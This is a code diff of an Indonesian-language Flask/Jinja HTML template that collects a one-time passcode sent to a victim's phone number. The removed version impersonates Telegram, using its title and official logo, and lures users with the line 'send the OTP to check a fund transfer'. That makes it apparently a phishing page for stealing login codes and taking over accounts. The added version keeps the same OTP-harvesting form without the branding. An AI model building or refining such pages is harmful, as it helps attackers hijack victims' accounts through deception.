@@ -1,195 +1,25 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram</title>
-    <link rel="icon" type="image/png" href="https://telegram.org/img/t_logo.svg">
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f5f5f5;
-        }
-
-        .header {
-            position: fixed;
-            top: 0;
-            width: 100%;
-            height: 60px;
-            background-color: #ffffff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            border-bottom: 1px solid #e0e0e0;
-        }
-
-        .header .divider {
-            display: flex;
-            gap: 8px;
-        }
-
-        .divider-line {
-            width: 2px;
-            height: 20px;
-            background-color: #333;
-        }
-
-        .container {
-            width: 95%;
-            max-width: 500px;
-            margin-top: 80px;
-            background: #ffffff;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-
-        .logo {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto 20px;
-        }
-
-        .logo img {
-            width: 100%;
-            height: 100%;
-        }
-
-        h1 {
-            font-size: 22px;
-            color: #333;
-            text-align: center;
-            margin-bottom: 8px;
-        }
-
-        .description {
-            color: #666;
-            text-align: center;
-            margin-bottom: 24px;
-            font-size: 14px;
-        }
-
-        .otp-message {
-            color: #0088cc;
-            text-align: center;
-            margin-bottom: 20px;
-            font-size: 15px;
-            font-weight: 500;
-        }
-
-        .input-row {
-            background: #ffffff;
-            border: 1px solid #e0e0e0;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            overflow: hidden;
-            transition: all 0.3s ease;
-        }
-
-        .input-row:hover {
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-            border-color: #d0d0d0;
-        }
-
-        .otp-input {
-            width: 100%;
-            padding: 14px 16px;
-            border: none;
-            font-size: 18px;
-            text-align: center;
-            letter-spacing: 8px;
-            color: #333;
-        }
-
-        .otp-input:focus {
-            outline: none;
-            background: #fff;
-        }
-
-        .status-button {
-            width: 100%;
-            padding: 15px 20px;
-            font-size: 15px;
-            font-weight: bold;
-            border: none;
-            border-radius: 6px;
-            background-color: #0088cc;
-            color: #fff;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .status-button:hover {
-            background-color: #006699;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-        }
-
-        .flash-messages {
-            margin-top: 16px;
-        }
-
-        .flash-messages ul {
-            list-style: none;
-            padding: 0;
-        }
-
-        .flash-messages li {
-            color: #721c24;
-            background-color: #f8d7da;
-            padding: 10px;
-            border-radius: 8px;
-            text-align: center;
-            margin-bottom: 8px;
-        }
-    </style>
+    <title>Verifikasi OTP</title>
 </head>
 <body>
-    <header class="header">
-        <div class="divider">
-            <div class="divider-line"></div>
-            <div class="divider-line"></div>
-            <div class="divider-line"></div>
-        </div>
-    </header>
-    <div class="container">
-        <div class="logo">
-            <img src="https://telegram.org/img/t_logo.svg" alt="Telegram Logo">
-        </div>
-        <h1>Masukkan OTP</h1>
-        <p class="description">Masukkan kode OTP yang dikirim ke nomor: {{ phone_number }}</p>
-        <p class="otp-message">Kirim OTP untuk cek transfer dana</p>
-        
-        <form method="POST">
-            <div class="input-row">
-                <input type="text" 
-                       class="otp-input" 
-                       id="otp" 
-                       name="otp" 
-                       placeholder="123456" 
-                       maxlength="6" 
-                       required>
-            </div>
-
-            <button type="submit" class="status-button">VERIFIKASI</button>
-        </form>
-
-        {% with messages = get_flashed_messages() %}
-          {% if messages %}
-            <div class="flash-messages">
-              <ul>
-                {% for message in messages %}
-                  <li>{{ message }}</li>
-                {% endfor %}
-              </ul>
-            </div>
-          {% endif %}
-        {% endwith %}
-    </div>
+    {% with messages = get_flashed_messages() %}
+        {% if messages %}
+            {% for message in messages %}
+                <p>{{ message }}</p>
+            {% endfor %}
+        {% endif %}
+    {% endwith %}
+    
+    <h2>Verifikasi OTP</h2>
+    <p>Masukkan kode OTP yang dikirim ke nomor: {{ phone_number }}</p>
+    
+    <form method="POST">
+        <input type="text" name="otp" placeholder="Kode OTP" required>
+        <button type="submit">Verifikasi</button>
+    </form>
+    
+    <p><a href="{{ url_for('index') }}">Kembali ke Halaman Utama</a></p>
 </body>
 </html>
